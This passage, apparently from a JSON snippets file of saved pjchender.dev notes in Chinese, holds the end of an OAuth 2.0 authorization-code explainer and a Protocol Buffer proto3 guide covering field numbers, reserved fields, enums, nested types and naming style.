class=\"hash-link\" aria-label=\"B. 問 Resource Owner的直接連結\" title=\"B. 問 Resource Owner的直接連結\">​</a></h4><ul><li>Authorization Server（Facebook）收到請求後會根據 Client ID 找 Client、確認 <code>Redirect URI</code>、確認想申請的 <code>scope</code>，都沒問題再詢問 <code>Resource Owner(User)</code> 要不要授權。</li></ul><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"c-client-收到-grant-codeauthorization-code\">C. Client 收到 Grant Code/Authorization Code<a href=\"#c-client-收到-grant-codeauthorization-code\" class=\"hash-link\" aria-label=\"C. Client 收到 Grant Code/Authorization Code的直接連結\" title=\"C. Client 收到 Grant Code/Authorization Code的直接連結\">​</a></h4><ul><li>如果 <code>Resource Owner(User)</code> 給予授權，則轉回 <code>Client(App)</code> 時會附上 <code>Grant Code/Authorization Code</code>；若不允許，則轉回 <code>Client(App)</code> 時會附上錯誤訊息（通常會把資訊帶在回傳的 URL 上）。</li></ul><blockquote><p>使用者授權 App 後取得的代碼稱作 <code>Grant Code</code> 或 <code>Authorization Code</code></p></blockquote><p><img loading=\"lazy\" src=\"../../../i.imgur.com/nHyWRNz.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/Wn7PzvI.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"d-拿-grant-code-換-token\">D. 拿 Grant Code 換 Token<a href=\"#d-拿-grant-code-換-token\" class=\"hash-link\" aria-label=\"D. 拿 Grant Code 換 Token的直接連結\" title=\"D. 拿 Grant Code 換 Token的直接連結\">​</a></h4><ul><li><code>Client(App)</code> 再拿到 <code>Grant Code</code> 之後即可發 Request 到 Authorization Server 的<code>Token Endpoint</code> 換 <code>Token</code></li><li>Authorization Server 收到後確認 Client Authentication 正確、找到該 <code>Grand Code/Authorization Code</code>、確認 <code>Redirect URI</code> 是一致的後，就回傳 <code>Access Token</code></li></ul><p><img loading=\"lazy\" src=\"../../../i.imgur.com/VVU5WCQ.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"e-發-token\">E. 發 Token<a href=\"#e-發-token\" class=\"hash-link\" aria-label=\"E. 發 Token的直接連結\" title=\"E. 發 Token的直接連結\">​</a></h4><p><img loading=\"lazy\" src=\"../../../i.imgur.com/zFuUFMc.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"流程web-app\">流程（Web App）<a href=\"#流程web-app\" class=\"hash-link\" aria-label=\"流程（Web App）的直接連結\" title=\"流程（Web App）的直接連結\">​</a></h2><p><img loading=\"lazy\" src=\"../../../i.imgur.com/oXp0osY.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/kJuVU13.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/5CwXycb.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"錯誤處理\">錯誤處理<a href=\"#錯誤處理\" class=\"hash-link\" aria-label=\"錯誤處理的直接連結\" title=\"錯誤處理的直接連結\">​</a></h2><p><img loading=\"lazy\" src=\"../../../i.imgur.com/PPfviji.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"拿到-token-後如何打-api\">拿到 Token 後如何打 API<a href=\"#拿到-token-後如何打-api\" class=\"hash-link\" aria-label=\"拿到 Token 後如何打 API的直接連結\" title=\"拿到 Token 後如何打 API的直接連結\">​</a></h2><ul><li>推薦：(in Header) <code>Authorization: Bearer 2YotnFZF...</code></li><li>(in Body) <code>&amp;access_token=2YotnFZF...</code><ul><li>不可以是 <code>multi-part</code></li><li>Content-Type: <code>application/x-www-form-urlencoded</code></li></ul></li><li>不推薦：(in URL) <code>?access_token=2YotnFZF...</code></li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考\">參考<a href=\"#參考\" class=\"hash-link\" aria-label=\"參考的直接連結\" title=\"參考的直接連結\">​</a></h2><ul><li><a href=\"http://www.ruanyifeng.com/blog/2019/04/oauth_design.html\" target=\"_blank\" rel=\"noopener noreferrer\">OAuth 2.0 的一個簡單解釋</a> @ 阮一峰的網絡日誌</li><li><a href=\"http://www.ruanyifeng.com/blog/2019/04/oauth-grant-types.html\" target=\"_blank\" rel=\"noopener noreferrer\">OAuth 2.0 的四種方式</a> @ 阮一峰的網絡日誌</li><li><a href=\"https://speakerdeck.com/chitsaou/jian-dan-yi-dong-de-oauth-2-dot-0\" target=\"_blank\" rel=\"noopener noreferrer\">簡單易懂的 OAuth 2.0</a> by Yu-Cheng Chuang @ Speakerdeck</li><li><a href=\"https://medium.freecodecamp.org/how-to-dance-the-oauth-a-step-by-step-lesson-fd2364d89742\" target=\"_blank\" rel=\"noopener noreferrer\">How to dance the OAuth: a step-by-step lesson</a> @ freeCodeCamp</li><li><a href=\"https://developers.google.com/identity/protocols/oauth2\" target=\"_blank\" rel=\"noopener noreferrer\">Using OAuth 2.0 to Access Google APIs</a> @ Google Developers</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [Note] Protocol Buffer 筆記 pjchender.dev": {
    "prefix": "hinternet [Note] Protocol Buffer 筆記 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[Note] Protocol Buffer 筆記</h1></header><blockquote><p><a href=\"https://developers.google.com/protocol-buffers/docs/proto3\" target=\"_blank\" rel=\"noopener noreferrer\">Language Guide (proto3)</a> @ Google Developers</p></blockquote><div class=\"theme-admonition theme-admonition-info alert alert--info admonition_LlT9\"><div class=\"admonitionHeading_tbUL\"><span class=\"admonitionIcon_kALy\"><svg viewBox=\"0 0 14 16\"><path fill-rule=\"evenodd\" d=\"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z\"></path></svg></span>信息</div><div class=\"admonitionContent_S0QG\"><p>如果單純只使用 <a href=\"https://github.com/golang/protobuf\" target=\"_blank\" rel=\"noopener noreferrer\">protocol buffer</a> 的 go 套件，並沒有實作 go-grpc 的功能，若需要在 grpc 中使用 protocol buffer 需進一步參考 <a href=\"https://github.com/grpc/grpc-go\" target=\"_blank\" rel=\"noopener noreferrer\">go-grpc</a></p></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"為什麼使用-protocol-buffer-而非-json\">為什麼使用 Protocol Buffer 而非 JSON<a href=\"#為什麼使用-protocol-buffer-而非-json\" class=\"hash-link\" aria-label=\"為什麼使用 Protocol Buffer 而非 JSON的直接連結\" title=\"為什麼使用 Protocol Buffer 而非 JSON的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"json-的好處\">JSON 的好處<a href=\"#json-的好處\" class=\"hash-link\" aria-label=\"JSON 的好處的直接連結\" title=\"JSON 的好處的直接連結\">​</a></h3><ul><li>資料可以用任何形式，例如陣列、nested object</li><li>在 Web 中被廣泛使用，且作為資料交換的方式</li><li>多數語言都能解讀</li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"protocol-buffer-的好處\">Protocol Buffer 的好處<a href=\"#protocol-buffer-的好處\" class=\"hash-link\" aria-label=\"Protocol Buffer 的好處的直接連結\" title=\"Protocol Buffer 的好處的直接連結\">​</a></h3><ul><li>gRPC 使用 protocol buffer</li><li><strong>更快</strong>：payload size 比 JSON 小非常多，可以節省非常多耗用的流量</li><li><strong>效能更好</strong>：Parse JSON 是屬於 CPU intensive 的任務；protocol buffer 則是 binary format 的資料，更接近底層機器用來表徵資料的方式，因此所需消耗的 CPU 資源較少</li><li>能夠清楚定義型別（data types） ，並且有資料交換的 schema</li><li>可以寫註解在內</li><li>自動產生可以使用的程式碼（例如，gRPC）</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"protocol-declaration\">Protocol Declaration<a href=\"#protocol-declaration\" class=\"hash-link\" aria-label=\"Protocol Declaration的直接連結\" title=\"Protocol Declaration的直接連結\">​</a></h2><div class=\"language-protobuf codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-protobuf codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">syntax = &quot;proto3&quot;;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">package sandbox.protobuf_sandbox.proto.addressbook;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">option go_package = &quot;sandbox/protobuf-sandbox/proto&quot;;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">import &quot;google/protobuf/timestamp.proto&quot;;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><ul><li><code>package</code> 是用來避免在不同專案之間的名稱衝突</li><li><code>go_package</code> 是選填的（option），用來載入 proto 編譯後的檔案</li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"定義-message-type\">定義 Message Type<a href=\"#定義-message-type\" class=\"hash-link\" aria-label=\"定義 Message Type的直接連結\" title=\"定義 Message Type的直接連結\">​</a></h3><div class=\"language-protobuf codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-protobuf codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">message SearchRequest {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  string query = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  int32 page_number = 2;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  int32 result_per_page = 3;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><ul><li><strong>field</strong>：在 message 中每一行都是一個 field，並包含有名稱（name）和型別（type）</li><li><strong>field type</strong>：每個欄位的第一個值是用來定義該欄位的型別</li><li><strong>field number</strong>：每個欄位的最後有一個數字，這是數字將是唯一值（unique number），用來在 message binary format 中辨認欄位用</li></ul><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"field-number\">field number<a href=\"#field-number\" class=\"hash-link\" aria-label=\"field number的直接連結\" title=\"field number的直接連結\">​</a></h4><p>可以看到每一個欄位都含有一個獨特的數字（unique number），這個數字是用來在 message binary format 中辨認欄位用的，<strong>一旦這個 message type 正在使用中就不應該再改變它</strong>，因此撰寫時並不一定要照著數字的順序，只要確保它是唯一個。由於數字 1~15 會使用 1 個 byte，數字 16~2047 會使用 2 個 byte，因此一般來說，會把<strong>最常用到的欄位使用 1~15 來編碼，但也要記得預留 1~15 的空間，因為未來可能會新增其他常用到的欄位</strong>。</p><p>數字可以從 1 一直到 536,870,911（<code>2^29 -1</code>），但<strong>你不能使用 19000~19999 這個區間</strong>，因是這個區間是給 Protocol Buffer 實作用的</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"被保留的欄位reserved-fields\">被保留的欄位（reserved fields）<a href=\"#被保留的欄位reserved-fields\" class=\"hash-link\" aria-label=\"被保留的欄位（reserved fields）的直接連結\" title=\"被保留的欄位（reserved fields）的直接連結\">​</a></h4><p>在建立好 proto 檔後，未來更新 message 時若是直接移除（註解）掉某個欄位時，後續維護的開發者在不知情的情況下，可能會用到曾經被使用過的 field number，由於 gRPC 是透過 field number 來辨別欄位，因此重複的 field number 將會導致嚴重的問題。</p><p>為了避免這個問題，是把曾經使用過的 field numbers 註記保留下來，未來 protocol buffer 在 compiled 時如果有使用到這些 reserved fields 時就會提出警告。</p><div class=\"language-protobuf codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-protobuf codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">message Foo {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  reserved 2, 15, 9 to 11;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  reserved &quot;foo&quot;, &quot;bar&quot;;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"型別\">型別<a href=\"#型別\" class=\"hash-link\" aria-label=\"型別的直接連結\" title=\"型別的直接連結\">​</a></h3><blockquote><p><a href=\"https://developers.google.com/protocol-buffers/docs/proto3\" target=\"_blank\" rel=\"noopener noreferrer\">Protocol Buffers: Language Guide</a> @ Google Developers</p></blockquote><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"scalar-value-types純量型別\">Scalar Value Types（純量型別）<a href=\"#scalar-value-types純量型別\" class=\"hash-link\" aria-label=\"Scalar Value Types（純量型別）的直接連結\" title=\"Scalar Value Types（純量型別）的直接連結\">​</a></h4><blockquote><p><a href=\"https://developers.google.com/protocol-buffers/docs/proto3#scalar\" target=\"_blank\" rel=\"noopener noreferrer\">Scalar Value Types</a> @ Google Developer Docs</p></blockquote><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"default-values預設值\">Default Values（預設值）<a href=\"#default-values預設值\" class=\"hash-link\" aria-label=\"Default Values（預設值）的直接連結\" title=\"Default Values（預設值）的直接連結\">​</a></h4><p>當 encoded message 的欄位沒有賦值時，再被解析後將被賦予預設值，這個預設值會根據型別的不同而不同。字串的預設值會是「空字串」、數值的預設值會是 0、Boolean 的預設值會是 false。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"enumerations\">Enumerations<a href=\"#enumerations\" class=\"hash-link\" aria-label=\"Enumerations的直接連結\" title=\"Enumerations的直接連結\">​</a></h4><ul><li>在所有 enum 的定義中，第一個元素一定要是能夠 map 到 0 的常數</li></ul><div class=\"language-protobuf codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-protobuf codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">message SearchRequest {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  string query = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  int32 page_number = 2;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  int32 result_per_page = 3;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  enum Corpus {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    UNIVERSAL = 0;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    WEB = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    IMAGES = 2;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    LOCAL = 3;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    NEWS = 4;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    PRODUCTS = 5;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    VIDEO = 6;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  }</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  Corpus corpus = 4;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"使用其他的-message-type\">使用其他的 message type<a href=\"#使用其他的-message-type\" class=\"hash-link\" aria-label=\"使用其他的 message type的直接連結\" title=\"使用其他的 message type的直接連結\">​</a></h3><p>在一個 message type 中可以使用另一個定義好的 message type。舉例來說，在 <code>SearchResponse</code> 這個 message type 中可以使用 <code>Result</code> 這個 message type：</p><div class=\"language-protobuf codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-protobuf codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">// repeated &lt;型別&gt; &lt;欄位名稱&gt; = &lt;tag-number&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">message SearchResponse {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  repeated Result results = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">}</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">message Result {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  string url = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  string title = 2;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  repeated string snippets = 3;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"匯入定義importing-definitions\">匯入定義（importing definitions）<a href=\"#匯入定義importing-definitions\" class=\"hash-link\" aria-label=\"匯入定義（importing definitions）的直接連結\" title=\"匯入定義（importing definitions）的直接連結\">​</a></h4><p>除了把 message type 定義在同一支檔案之外，你也可以定義在不同的 proto 檔中，再透過 <code>import</code> 將 message type 匯入使用：</p><div class=\"language-protobuf codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-protobuf codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">import &quot;myproject/other_protos.proto&quot;;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"nested-type\">Nested Type<a href=\"#nested-type\" class=\"hash-link\" aria-label=\"Nested Type的直接連結\" title=\"Nested Type的直接連結\">​</a></h4><p>另外，你也可以在一個 message type 中定義另一個 message type：</p><div class=\"language-protobuf codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-protobuf codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">message SearchResponse {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  message Result {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    string url = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    string title = 2;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    repeated string snippets = 3;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  }</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  repeated Result results = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"any\">Any<a href=\"#any\" class=\"hash-link\" aria-label=\"Any的直接連結\" title=\"Any的直接連結\">​</a></h4><div class=\"language-protobuf codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-protobuf codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">import &quot;google/protobuf/any.proto&quot;;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">message ErrorStatus {</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  string message = 1;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  repeated google.protobuf.Any details = 2;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"style-guide\">Style Guide<a href=\"#style-guide\" class=\"hash-link\" aria-label=\"Style Guide的直接連結\" title=\"Style Guide的直接連結\">​</a></h2><blockquote><p><a href=\"https://developers.google.com/protocol-buffers/docs/style\" target=\"_blank\" rel=\"noopener noreferrer\">Style Guide</a> @ Google Developer Docs</p></blockquote><ul><li><strong>檔案名稱</strong>：以小寫 snack case 命名，例如 <code>lower_snake_case.proto</code></li><li><strong>Package 名稱</strong>：包含專案資料夾在內，以小寫命名，例如檔案在 <code>my/package/</code> 的話，便把該 package 命名為 <code>my.package</code></li><li><strong>Services name</strong>：使用大寫駝峰，例如 <code>service FooService { }</code></li><li><strong>Message names</strong>：使用大寫駝峰，例如 <code>message SongServerRequest{ }</code></li><li><strong>欄位名稱（field）</strong>：使用小寫 snake case 命名，例如，<code>song_name</code>，如果欄位名稱的最後帶有數字，則直接把數字跟在英文後，使用 <code>song_name1</code>（不要使用 <code>song_name_1</code>）</li><li>Enums 型別：<ul><li>欄位名稱使用大寫駝峰</li><li>欄位的常數值使用使用「大寫加上底線」，最後加上「分號」而非逗號</li><li>對於 zero value 的 enum 使用 <code>_UNSPECIFIED</code> 當作後綴</li></ul></li></ul><div class=\"language-protobuf codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-protobuf codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token 